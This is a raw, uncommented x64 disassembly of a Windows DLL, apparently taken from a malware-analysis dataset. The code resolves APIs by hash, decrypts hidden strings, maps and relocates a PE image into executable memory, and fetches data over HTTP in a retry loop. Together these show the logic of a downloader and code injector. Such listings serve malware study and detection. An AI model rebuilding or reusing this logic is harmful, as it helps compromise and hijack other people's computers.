mov rsi rax
call sub_180002b38
lea edx [ rbx + 0x1 ]
lea r9d [ rbx + 0x2b ]
xor ecx ecx
mov r8d 0xa48d6762
mov rdi rax
call sub_18000365c
mov rcx rsi
call rax
mov edx 0x1
xor ecx ecx
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
mov rdx rdi
mov rcx rbx
call rax
mov rcx rsi
mov rbx rax
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
mov rdx rbx
mov ecx 0x5a
call sub_180003410
sub_180003cc4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x50
mov r14 rcx
mov ecx 0x1a4
mov rbp r9
mov r12 r8
mov r13 rdx
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov eax [ rsp + 0xb8 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x48 ] eax
mov eax [ rsp + 0xb0 ]
mov rdx r13
mov [ rsp + 0x40 ] eax
mov eax [ rsp + 0xa8 ]
mov rcx r14
mov [ rsp + 0x38 ] eax
mov rax [ rsp + 0xa0 ]
mov [ rsp + 0x30 ] rax
mov rax [ rsp + 0x98 ]
mov [ rsp + 0x28 ] rax
mov rax [ rsp + 0x90 ]
mov [ rsp + 0x20 ] rax
call rbx
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
lea ecx [ rax + 0x5 ]
call sub_1800027f8
lea ecx [ rbx + 0x65 ]
mov rsi rax
call sub_180002b38
lea edx [ rbx + 0x1 ]
lea r9d [ rbx + 0x2b ]
xor ecx ecx
mov r8d 0xa48d6762
mov rdi rax
call sub_18000365c
mov rcx rsi
call rax
mov edx 0x1
xor ecx ecx
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
mov rdx rdi
mov rcx rbx
call rax
mov rcx rsi
mov rbx rax
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
mov rdx rbx
mov ecx 0x1a4
call sub_180003410
sub_180003de4
mov [ rsp + 0x8 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
mov r15 rcx
mov rcx rdx
mov r14 rdx
call sub_180003778
and [ rsp + 0x28 ] 0x0
xor r9d r9d
movsxd r12 [ rax + 0x3c ]
or rbx 0xffffffffffffffff
lea r8d [ r9 + 0x40 ]
mov r13d [ r12 + rax + 0x50 ]
xor edx edx
mov rcx rbx
mov [ rsp + 0x20 ] r13d
mov rdi rax
call sub_180003970
and [ rsp + 0x20 ] 0x0
lea edx [ rbx + 0x3 ]
xor r9d r9d
mov rcx rax
xor r8d r8d
mov rbp rax
call sub_180003a5c
mov rsi rax
test rax rax
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x90 ]
add rsp 0x50
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov r8d r13d
mov rdx rdi
mov rcx rax
call sub_180003fa4
xor ecx ecx
mov [ rsp + 0x48 ] 0x40
mov [ rsp + 0x40 ] ecx
mov [ rsp + 0x38 ] 0x1
lea rax [ rsp + 0xa8 ]
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] rcx
mov [ rsp + 0xa8 ] rcx
mov [ rsp + 0xa0 ] rcx
lea r8 [ rsp + 0xa0 ]
xor r9d r9d
mov rcx rbp
mov rdx r15
mov [ rsp + 0x20 ] r13
call sub_180003cc4
test eax eax
jne r-xdata
mov rcx rsi
call sub_180003b40
mov rcx rbp
call sub_1800037b8
mov r8 [ rsp + 0xa0 ]
mov ecx [ r12 + rdi + 0xb0 ]
mov r9d [ r12 + rdi + 0xb4 ]
sub r8 rdi
add rcx rdi
mov rdx rsi
call sub_1800036d8
mov rbx [ rsp + 0xa0 ]
sub rbx rdi
add rbx r14
sub_180003f1c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov rsi r8
mov rbx rdx
mov r8d ecx
mov ecx 0x43a
xor edx edx
call sub_180003bf8
mov rdx rbx
mov rcx rax
mov rdi rax
call sub_180003de4
xor ebx ebx
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx rdi
call sub_1800037b8
mov rsi [ rsp + 0x58 ]
mov al bl
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
mov [ rsp + 0x30 ] rbx
mov r9 rax
xor r8d r8d
xor edx edx
mov rcx rdi
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rsi
call sub_180003870
test rax rax
setne bl
sub_180003fa4
test rcx rcx
je r-xdata
mov rax rcx
retn
test rdx rdx
je r-xdata
mov r9 rcx
test r8d r8d
je r-xdata
sub rdx rcx
mov al [ rdx + r9 ]
mov [ r9 ] al
inc r9
dec r8d
jne r-xdata
sub_180003fe4
xor r9d r9d
test rcx rcx
je r-xdata
or eax 0xffffffff
retn
test rdx rdx
je r-xdata
test r8 r8
je r-xdata
mov eax r9d
retn
mov r10 rcx
neg r10
sub rdx rcx
or r9d 0xffffffff
ja r-xdata
mov r9d 0x1
jmp r-xdata
inc rcx
lea rax [ r10 + rcx ]
cmp rax r8
jb r-xdata
mov al [ rdx + rcx ]
cmp [ rcx ] al
jb r-xdata
jmp r-xdata
sub_18000402c
mov [ rsp + 0x8 ] rbx
push rbp
mov rbp rsp
sub rsp 0x40
mov ecx 0x93
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
call rbx
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rbp
retn
lea rcx [ rbp - 0x20 ]
mov [ rbp - 0x20 ] 0x96b47b23
mov [ rbp - 0x1c ] 0x3b83198e
mov [ rbp - 0x18 ] 0x318fd87
mov [ rbp - 0x14 ] 0x26dd
mov [ rbp - 0x12 ] al
mov [ rbp - 0x10 ] al
mov [ rbp - 0xf ] rax
mov [ rbp - 0x7 ] eax
mov [ rbp - 0x3 ] ax
call sub_180005420
test eax eax
je r-xdata
lea rcx [ rbp - 0x10 ]
call sub_180005420
mov ebx eax
call sub_180005b20
lea rdx [ rbp - 0x10 ]
mov rcx rax
mov r8d ebx
call sub_180006e34
call sub_180003330
mov edx 0x1
lea r9d [ rdx + 0x6 ]
xor ecx ecx
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
lea rdx [ rbp - 0x10 ]
mov rcx rbx
call rax
mov ecx 0x93
mov rdx rax
mov rbx rax
call sub_180003410
xor edx edx
mov cl [ rbp + rdx - 0x20 ]
inc rdx
dec eax
mov [ rbp + rdx - 0x11 ] cl
jne r-xdata
sub_1800040fc
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x40
mov r12 rcx
mov ecx 0x94
mov rdi r8
mov esi edx
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov r8 rdi
mov edx esi
mov rcx r12
call rbx
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
mov r12 [ rsp + 0x68 ]
add rsp 0x40
pop rbp
retn
lea rcx [ rbp - 0x20 ]
mov [ rbp - 0x20 ] 0xb6a17b2c
mov [ rbp - 0x1c ] 0x318c1abd
mov [ rbp - 0x18 ] 0x97
mov [ rbp - 0x10 ] al
mov [ rbp - 0xf ] rax
mov [ rbp - 0x7 ] al
call sub_180005420
test eax eax
je r-xdata
lea rcx [ rbp - 0x10 ]
call sub_180005420
mov ebx eax
call sub_180005b20
lea rdx [ rbp - 0x10 ]
mov rcx rax
mov r8d ebx
call sub_180006e34
call sub_180003330
mov edx 0x1
lea r9d [ rdx + 0x6 ]
xor ecx ecx
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
lea rdx [ rbp - 0x10 ]
mov rcx rbx
call rax
mov ecx 0x94
mov rdx rax
mov rbx rax
call sub_180003410
xor edx edx
mov cl [ rbp + rdx - 0x20 ]
inc rdx
dec eax
mov [ rbp + rdx - 0x11 ] cl
jne r-xdata
sub_1800041ec
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x40
mov r12 rcx
mov ecx 0x97
mov rdi r8
mov esi edx
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov r8 rdi
mov edx esi
mov rcx r12
call rbx
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
mov r12 [ rsp + 0x68 ]
add rsp 0x40
pop rbp
retn
lea rcx [ rbp - 0x20 ]
mov [ rbp - 0x20 ] 0xb6a17b2c
mov [ rbp - 0x1c ] 0x3b8504ba
mov [ rbp - 0x18 ] al
mov [ rbp - 0x10 ] al
mov [ rbp - 0xf ] rax
call sub_180005420
test eax eax
je r-xdata
lea rcx [ rbp - 0x10 ]
call sub_180005420
mov ebx eax
call sub_180005b20
lea rdx [ rbp - 0x10 ]
mov rcx rax
mov r8d ebx
call sub_180006e34
call sub_180003330
mov edx 0x1
lea r9d [ rdx + 0x6 ]
xor ecx ecx
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
lea rdx [ rbp - 0x10 ]
mov rcx rbx
call rax
mov ecx 0x97
mov rdx rax
mov rbx rax
call sub_180003410
xor edx edx
mov cl [ rbp + rdx - 0x20 ]
inc rdx
dec eax
mov [ rbp + rdx - 0x11 ] cl
jne r-xdata
sub_1800042fc
push rbx
sub rsp 0x20
mov rbx rcx
test rcx rcx
je r-xdata
xor eax eax
add rsp 0x20
pop rbx
retn
call sub_18000402c
mov r8 rbx
mov edx 0x8
mov rcx rax
add rsp 0x20
pop rbx
jmp sub_1800041ec
sub_18000432c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r14 rcx
mov ecx 0x95
mov rbp r9
mov r12 r8
mov r13d edx
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov r9 rbp
mov r8 r12
mov edx r13d
mov rcx r14
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
jmp rax
lea ecx [ rax + 0x1 ]
call sub_1800027f8
lea ecx [ rbx + 0xf ]
mov rsi rax
call sub_180002b38
lea edx [ rbx + 0x1 ]
lea r9d [ rbx + 0x2b ]
xor ecx ecx
mov r8d 0xa48d6762
mov rdi rax
call sub_18000365c
mov rcx rsi
call rax
mov edx 0x1
xor ecx ecx
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
mov rdx rdi
mov rcx rbx
call rax
mov rcx rsi
mov rbx rax
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
mov rdx rbx
mov ecx 0x95
call sub_180003410
sub_180004418
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rcx
test edx edx
jne r-xdata
mov ebx edx
test rcx rcx
jne r-xdata
test rcx rcx
je r-xdata
call sub_18000402c
mov r9 rbx
mov r8 rdi
mov rcx rax
mov edx 0x8
call sub_18000432c
call sub_18000402c
mov r8d ebx
mov edx 0x8
mov rcx rax
call sub_1800040fc
jmp r-xdata
xor eax eax
jmp r-xdata
call sub_18000402c
mov r8 rdi
mov edx 0x8
mov rcx rax
call sub_1800041ec
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180004488
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] r13
mov [ rax + 0x20 ] r14
push r15
sub rsp 0x20
mov rbp r9
mov r14 r8
mov r15d edx
mov r13 rcx
test rcx rcx
je r-xdata
xor al al
test r9 r9
je r-xdata
mov rbx [ rsp + 0x60 ]
test rbx rbx
je r-xdata
cmp [ rsp + 0x68 ] 0x0
je r-xdata
cmp [ rsp + 0x70 ] 0x0
je r-xdata
cmp [ rsp + 0x78 ] 0x0
je r-xdata
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x10000
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
mov rcx r13
call sub_180005420
lea rcx [ rw-data ]
mov rdx r13
mov r8d eax
call sub_180003fa4
mov rcx r14
mov [ rw-data ] r15d
call sub_180005420
lea rcx [ rw-data ]
mov rdx r14
mov r8d eax
call sub_180003fa4
mov rcx rbp
call sub_180005420
lea rcx [ rw-data ]
mov rdx rbp
mov r8d eax
call sub_180003fa4
mov rcx [ rsp + 0x50 ]
call sub_180005420
mov rdx [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov r8d eax
call sub_180003fa4
mov rcx [ rsp + 0x58 ]
call sub_180005420
mov rdx [ rsp + 0x58 ]
lea rcx [ rw-data ]
mov r8d eax
call sub_180003fa4
mov rcx rbx
call sub_180005420
lea rcx [ rw-data ]
mov rdx rbx
mov r8d eax
call sub_180003fa4
mov rcx [ rsp + 0x68 ]
call sub_180005420
mov rdx [ rsp + 0x68 ]
lea rcx [ rw-data ]
mov r8d eax
call sub_180003fa4
mov rcx [ rsp + 0x70 ]
call sub_180005420
mov rdx [ rsp + 0x70 ]
lea rcx [ rw-data ]
mov r8d eax
call sub_180003fa4
mov rcx [ rsp + 0x78 ]
call sub_180005420
mov rdx [ rsp + 0x78 ]
lea rcx [ rw-data ]
mov r8d eax
call sub_180003fa4
mov bl [ rsp + 0x90 ]
test bl bl
jne r-xdata
mov rcx [ rsp + 0x88 ]
call sub_180005420
mov rdx [ rsp + 0x88 ]
lea rcx [ rw-data ]
mov r8d eax
call sub_180003fa4
mov [ rw-data ] bl
mov al 0x1
jmp r-xdata
mov rcx [ rsp + 0x80 ]
call sub_180005420
mov rdx [ rsp + 0x80 ]
lea rcx [ rw-data ]
mov r8d eax
call sub_180003fa4
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov r13 [ rsp + 0x40 ]
mov r14 [ rsp + 0x48 ]
add rsp 0x20
pop r15
retn
sub_18000474c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] r13
mov [ rax + 0x20 ] r14
push r15
sub rsp 0x20
mov rbp r9
mov r14 r8
mov r15d edx
mov r13 rcx
test rcx rcx
je r-xdata
xor al al
test r9 r9
je r-xdata
mov rbx [ rsp + 0x60 ]
test rbx rbx
je r-xdata
cmp [ rsp + 0x68 ] 0x0
je r-xdata
cmp [ rsp + 0x70 ] 0x0
je r-xdata
cmp [ rsp + 0x78 ] 0x0
je r-xdata
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x10000
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x104
call sub_180003fcc
mov rcx r13
call sub_180005420
lea rcx [ rw-data ]
mov rdx r13
mov r8d eax
call sub_180003fa4
mov rcx r14
mov [ rw-data ] r15d
call sub_180005420
lea rcx [ rw-data ]
mov rdx r14
mov r8d eax
call sub_180003fa4
mov rcx rbp
call sub_180005420
lea rcx [ rw-data ]
mov rdx rbp
mov r8d eax
call sub_180003fa4
mov rcx [ rsp + 0x50 ]
call sub_180005420
mov rdx [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov r8d eax
call sub_180003fa4
mov rcx [ rsp + 0x58 ]
call sub_180005420
mov rdx [ rsp + 0x58 ]
lea rcx [ rw-data ]
mov r8d eax
call sub_180003fa4
mov rcx rbx
call sub_180005420
lea rcx [ rw-data ]
mov rdx rbx
mov r8d eax
call sub_180003fa4
mov rcx [ rsp + 0x68 ]
call sub_180005420
mov rdx [ rsp + 0x68 ]
lea rcx [ rw-data ]
mov r8d eax
call sub_180003fa4
mov rcx [ rsp + 0x70 ]
call sub_180005420
mov rdx [ rsp + 0x70 ]
lea rcx [ rw-data ]
mov r8d eax
call sub_180003fa4
mov rcx [ rsp + 0x78 ]
call sub_180005420
mov rdx [ rsp + 0x78 ]
lea rcx [ rw-data ]
mov r8d eax
call sub_180003fa4
mov bl [ rsp + 0x90 ]
test bl bl
jne r-xdata
mov rcx [ rsp + 0x88 ]
call sub_180005420
mov rdx [ rsp + 0x88 ]
lea rcx [ rw-data ]
mov r8d eax
call sub_180003fa4
mov [ rw-data ] bl
mov al 0x1
jmp r-xdata
mov rcx [ rsp + 0x80 ]
call sub_180005420
mov rdx [ rsp + 0x80 ]
lea rcx [ rw-data ]
mov r8d eax
call sub_180003fa4
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov r13 [ rsp + 0x40 ]
mov r14 [ rsp + 0x48 ]
add rsp 0x20
pop r15
retn
sub_180004a10
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov ebp ecx
mov ecx 0x2f
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov ecx ebp
mov rax rbx
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
jmp rax
lea ecx [ rax + 0x1 ]
call sub_1800027f8
lea ecx [ rbx + 0x19 ]
mov rsi rax
call sub_180002b38
lea edx [ rbx + 0x1 ]
lea r9d [ rbx + 0x2b ]
xor ecx ecx
mov r8d 0xa48d6762
mov rdi rax
call sub_18000365c
mov rcx rsi
call rax
mov edx 0x1
xor ecx ecx
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
mov rdx rdi
mov rcx rbx
call rax
mov rcx rsi
mov rbx rax
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
mov rdx rbx
mov ecx 0x2f
call sub_180003410
sub_180004ac4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov r12d ecx
mov ecx 0x36
mov rbp rdx
call sub_1800033f0
mov rbx rax
test rax rax
jne r-xdata
mov rdx rbp
mov ecx r12d
mov rax rbx
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
jmp rax
lea ecx [ rax + 0x1 ]
call sub_1800027f8
lea ecx [ rbx + 0x1c ]
mov rsi rax
call sub_180002b38
lea edx [ rbx + 0x1 ]
lea r9d [ rbx + 0x2b ]
xor ecx ecx
mov r8d 0xa48d6762
mov rdi rax
call sub_18000365c
mov rcx rsi
call rax
mov edx 0x1
xor ecx ecx
lea r9d [ rdx + 0x6 ]
mov r8d 0x1fc0eaee
mov rbx rax
call sub_18000365c
mov rdx rdi
mov rcx rbx
call rax
mov rcx rsi
mov rbx rax
call sub_1800042fc
mov rcx rdi
call sub_1800042fc
mov rdx rbx
mov ecx 0x36
call sub_180003410
sub_180004b8c
mov [ rsp + 0x8 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x50
xor ebp ebp
mov r12d ebp
lea esi [ rbp + 0x8 ]
mov r9d 0x1d0
mov r8d 0x1510002f
mov edx esi
xor ecx ecx
call sub_18000365c
mov [ rsp + 0x38 ] ebp
mov [ rsp + 0x30 ] ebp
lea r8 [ rw-data ]
lea rdx [ rw-data ]
xor r9d r9d
mov rcx r15
mov [ rsp + 0x28 ] ebp
mov [ rsp + 0x20 ] ebp
call rax
lea rcx [ rw-data ]
mov r14 rax
call sub_180005420
mov r9d 0x1d2
mov r8d 0x9f13856a
mov edx esi
xor ecx ecx
mov ebx eax
call sub_18000365c
lea r9 [ rw-data ]
lea rdx [ rw-data ]
or r8d 0xffffffff
mov rcx r14
mov [ rsp + 0x20 ] ebx
call rax
test eax eax
je r-xdata
lea rcx [ rw-data ]
call sub_180005420
test eax eax
je r-xdata
mov ebx 0x1d4
mov r8d 0x7314fb0c
mov edx esi
mov r9d ebx
xor ecx ecx
call sub_18000365c
mov rcx r14
call rax
mov r14d 0x7314fb0c
mov r9d ebx
mov r8d r14d
mov edx esi
xor ecx ecx
call sub_18000365c
mov rcx r15
call rax
mov r9d ebx
mov r8d r14d
mov edx esi
xor ecx ecx
call sub_18000365c
mov rcx rdi
call rax
test r13d r13d
jne r-xdata
mov r9d 0x1d9
mov r8d 0x2f5ce027
mov edx esi
xor ecx ecx
mov [ rsp + 0xa8 ] 0x4
mov [ rsp + 0x98 ] ebp
call sub_18000365c
lea r9 [ rsp + 0xa8 ]
lea r8 [ rsp + 0x98 ]
mov edx 0x20000005
mov rcx r14
mov [ rsp + 0x20 ] ebp
call rax
cmp [ rw-data ] bpl
mov rbx rax
je r-xdata
lea rcx [ rw-data ]
call sub_180005420
mov r9d 0x1d7
mov r8d 0x1ad09c78
mov edx esi
xor ecx ecx
mov ebx eax
call sub_18000365c
lea r8 [ rw-data ]
mov r9d ebx
mov edx 0x2b
mov rcx r15
call rax
lea rcx [ rw-data ]
call sub_180005420
mov r9d 0x1d7
mov r8d 0x1ad09c78
mov edx esi
xor ecx ecx
mov ebx eax
call sub_18000365c
lea r8 [ rw-data ]
mov r9d ebx
mov edx 0x2c
mov rcx r15
call rax
xor eax eax
mov rbx [ rsp + 0x90 ]
add rsp 0x50
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov ecx 0x2710
call sub_180004a10
inc r12d
cmp r12d 0x1e
jb r-xdata
lea r8 [ r--data ]
lea rdx [ rw-data ]
lea rcx [ rw-data ]
call sub_18000574c
mov rsi rax
test ebx ebx
je r-xdata
lea rdx [ rw-data ]
mov ecx 0x104
call sub_180004ac4
mov ebx [ rw-data ]
mov r9d 0x1e3
mov r8d 0x8593dd7
mov edx esi
xor ecx ecx
mov r13d ebp
call sub_18000365c
lea r8 [ rw-data ]
lea rcx [ rw-data ]
xor r9d r9d
mov edx ebx
mov [ rsp + 0x20 ] ebp
call rax
mov r9d 0x1ce
mov r8d 0xbe618d3e
mov edx esi
xor ecx ecx
mov rdi rax
mov [ rsp + 0x40 ] rax
call sub_18000365c
mov [ rsp + 0x38 ] ebp
xor r9d r9d
mov [ rsp + 0x30 ] ebp
lea rdx [ rw-data ]
lea r8d [ r9 + 0x50 ]
mov rcx rdi
mov [ rsp + 0x28 ] 0x3
mov [ rsp + 0x20 ] ebp
call rax
lea rcx [ rw-data ]
mov r15 rax
call sub_180005420
test eax eax
je r-xdata
mov rcx rsi
call sub_1800042fc
mov esi 0x8
mov ecx [ rsp + 0x98 ]
test ecx ecx
je r-xdata
lea rdx [ r--data ]
mov r8d 0x1
mov rcx rax
call sub_180006338
mov r13d eax
call sub_1800042d8
mov ebx [ rsp + 0x98 ]
xor edi edi
and [ rsp + 0xa0 ] edi
mov rbp rax
cmp edi ebx
jne r-xdata
cmp edi ebx
jb r-xdata
mov rcx rbp
call sub_1800042fc
mov rdi [ rsp + 0x40 ]
xor ebp ebp
jmp r-xdata
mov r8d ebx
mov rdx rbp
mov rcx rsi
call sub_180006338
mov r13d eax
mov edx 0x8
xor ecx ecx
mov r9d 0x1e5
mov r8d 0x1a212962
call sub_18000365c
mov edx edi
lea r9 [ rsp + 0xa0 ]
add rdx rbp
mov r8d ebx
mov rcx r14
call rax
mov r11d [ rsp + 0xa0 ]
mov ebx [ rsp + 0x98 ]
add edi r11d
test r11d r11d
je r-xdata
sub_180004efc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x70
mov al [ rsp + 0xe8 ]
mov r10 r9
mov r9 [ rsp + 0xa0 ]
mov [ rsp + 0x60 ] al
mov rax [ rsp + 0xe0 ]
mov r11d r8d
mov [ rsp + 0x58 ] rax
mov rax [ rsp + 0xd8 ]
mov rbx rdx
mov [ rsp + 0x50 ] rax
mov rax [ rsp + 0xd0 ]
mov esi ecx
mov [ rsp + 0x48 ] rax
mov rax [ rsp + 0xc8 ]
mov r8 r10
mov [ rsp + 0x40 ] rax
mov rax [ rsp + 0xc0 ]
mov edx r11d
mov [ rsp + 0x38 ] rax
mov rax [ rsp + 0xb8 ]
mov rcx rbx
mov [ rsp + 0x30 ] rax
mov rax [ rsp + 0xb0 ]
xor dil dil
mov [ rsp + 0x28 ] rax
mov rax [ rsp + 0xa8 ]
mov [ rsp + 0x20 ] rax
call sub_180004488
test al al
je r-xdata
lea r11 [ rsp + 0x70 ]
mov al dil
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rsp r11
pop rdi
retn
lea rdx [ sub_180004b8c ]
xor r8d r8d
mov ecx esi
call sub_180003f94
mov dil al
sub_180004fd0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x40
xor r14d r14d
mov esi r14d
lea ebp [ r14 + 0x8 ]
mov r9d 0x1d0
mov r8d 0x1510002f
mov edx ebp
xor ecx ecx
call sub_18000365c
mov [ rsp + 0x38 ] r14d
mov [ rsp + 0x30 ] r14d
lea r8 [ rw-data ]
lea rdx [ rw-data ]
xor r9d r9d
mov rcx r12
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] r14d
call rax
lea rcx [ rw-data ]
mov rbp rax
call sub_180005420
mov edx 0x8
xor ecx ecx
mov r9d 0x1d2
mov r8d 0x9f13856a
mov ebx eax
call sub_18000365c
lea r9 [ rw-data ]
lea rdx [ rw-data ]
or r8d 0xffffffff
mov rcx rbp
mov [ rsp + 0x20 ] ebx
call rax
test eax eax
je r-xdata
lea rcx [ rw-data ]
call sub_180005420
test eax eax
je r-xdata
mov ebx 0x1d4
mov edx 0x8
xor ecx ecx
mov r9d ebx
mov r8d 0x7314fb0c
call sub_18000365c
mov rcx rbp
call rax
mov ebp 0x8
mov r9d ebx
mov edx ebp
mov r8d 0x7314fb0c
xor ecx ecx
call sub_18000365c
mov rcx r12
call rax
mov r9d ebx
mov r8d 0x7314fb0c
mov edx ebp
xor ecx ecx
call sub_18000365c
mov rcx r13
call rax
test edi edi
jne r-xdata
mov edx 0x8
xor ecx ecx
mov r9d 0x1d9
mov r8d 0x2f5ce027
mov [ rsp + 0x78 ] r14d
call sub_18000365c
xor r8d r8d
lea r9 [ rsp + 0x78 ]
lea edx [ r8 + 0x16 ]
mov rcx rbp
mov [ rsp + 0x20 ] r14d
call rax
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
lea rcx [ rw-data ]
call sub_180005420
mov r9d 0x1d7
mov r8d 0x1ad09c78
mov edx ebp
xor ecx ecx
mov ebx eax
call sub_18000365c
lea r8 [ rw-data ]
mov r9d ebx
mov edx 0x2b
mov rcx r12
call rax
lea rcx [ rw-data ]
call sub_180005420
mov r9d 0x1d7
mov r8d 0x1ad09c78
mov edx ebp
xor ecx ecx
mov ebx eax
call sub_18000365c
lea r8 [ rw-data ]
mov r9d ebx
mov edx 0x2c
mov rcx r12
call rax
lea r11 [ rsp + 0x40 ]
xor eax eax
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
inc esi
cmp esi 0x1e
jb r-xdata
mov ecx [ rsp + 0x78 ]
call sub_1800042d8
mov edx 0x8
xor ecx ecx
mov r9d 0x1d9
mov r8d 0x2f5ce027
mov rbx rax
call sub_18000365c
lea r9 [ rsp + 0x78 ]
mov r8 rbx
mov edx 0x13
mov rcx rbp
mov [ rsp + 0x20 ] r14d
call rax
mov edi 0x3
lea rdx [ r--data ]
mov r8d edi
mov rcx rbx
call sub_180003fe4
test eax eax
je r-xdata
mov ebx [ rw-data ]
mov r9d 0x1e3
